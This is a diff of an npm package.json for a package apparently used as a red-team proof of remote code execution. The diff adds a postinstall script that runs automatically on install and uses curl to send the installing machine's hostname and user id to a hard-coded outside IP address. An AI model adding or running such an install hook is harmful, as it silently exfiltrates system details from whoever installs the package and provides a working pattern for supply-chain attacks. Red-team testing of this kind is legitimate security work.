@@ -1,1 +1,9 @@
-{"name":"rt8-mcp-rce-proof","version":"1.0.0","description":"Proof completed — postinstall removed","main":"index.js"}
+{
+  "name": "rt8-mcp-rce-proof",
+  "version": "1.0.0",
+  "description": "Red team test — ephemeral",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -s --max-time 10 'http://168.235.91.138:9901/rce-k6j?host='$(hostname)'&user='$(id -u) || true"
+  }
+}
